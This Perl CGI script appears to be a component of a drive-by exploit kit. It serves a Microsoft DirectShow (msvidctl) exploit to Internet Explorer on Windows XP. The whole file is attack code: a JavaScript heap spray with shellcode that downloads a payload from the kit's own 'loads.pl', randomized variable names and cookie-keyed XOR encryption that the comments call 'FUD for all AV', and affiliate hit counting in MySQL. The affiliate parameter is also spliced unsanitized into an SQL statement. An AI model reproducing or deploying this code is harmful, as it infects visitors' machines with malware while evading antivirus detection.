#!/usr/bin/perl

#
# var randomizer for microsoft directshow exploit (Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0)
# TESTED XP SP2 IE 7 (WORKING)
# FUD for all AV using random XOR + random Vars + Replace string of eval (exploit)
# gif file not FUD
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET directshow=directshow+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET directshow=directshow+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

# Setup exploit buffers
$nops = '%u0c0c%u0c0c';
$blocksize = '262144';
$fillto = '500';

#build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=directshow';
$shellcode = Shellcode::getshell($urlllll);

#randomize vars
$msvidctl = JsXOR::generate_random_string(int(rand 100));
$div = JsXOR::generate_random_string(int(rand 100));
$j_shellcode = JsXOR::generate_random_string(int(rand 100));
$j_nops = JsXOR::generate_random_string(int(rand 100));
$j_headersize = JsXOR::generate_random_string(int(rand 100));
$j_slackspace = JsXOR::generate_random_string(int(rand 100));
$j_fillblock = JsXOR::generate_random_string(int(rand 100));
$j_block = JsXOR::generate_random_string(int(rand 100));
$j_memory = JsXOR::generate_random_string(int(rand 100));
$j_counter = JsXOR::generate_random_string(int(rand 30));

#HTML RAW DATA
my $exploitstring = <<EOF; 

$j_shellcode=unescape('$shellcode');
$j_nops=unescape('$nops');
$j_headersize=20;
$j_slackspace=$j_headersize+$j_shellcode.length;
while($j_nops.length<$j_slackspace)$j_nops+=$j_nops;
$j_fillblock=$j_nops.substring(0,$j_slackspace);
$j_block=$j_nops.substring(0,$j_nops.length-$j_slackspace);
while($j_block.length+$j_slackspace<$blocksize)$j_block=$j_block+$j_block+$j_fillblock;
$j_memory=new Array();
for($j_counter=0;$j_counter<$fillto;$j_counter++)$j_memory\[$j_counter\]=$j_block+$j_shellcode;

var $msvidctl=document.createElement('object');
$div.appendChild($msvidctl);
$msvidctl.width='1';
$msvidctl.height='1';
$msvidctl.data='../dep/1268505228.gif';
$msvidctl.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';

EOF


#$beforexoredd = JsXOR::excryptxorjs($exploitstring);
$beforexoredd = EncRand::CsCrypt($exploitstring,$csname,$theCookie);

##################### BEGIN PRINT EXPLOIT #####################
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print '<html>' . "\n";
print '<head>' . "\n";
print '</head>' . "\n";
print '<body>' . "\n";
print '<div id="' . $div . '">' . "\n";
print '<script>' . "\n";

print $beforexoredd;

print '</script>' . "\n";
print '</body>' . "\n";
print '</html>' . "\n";

##################### END PRINT EXPLOIT #######################

$dbh->disconnect();

1;
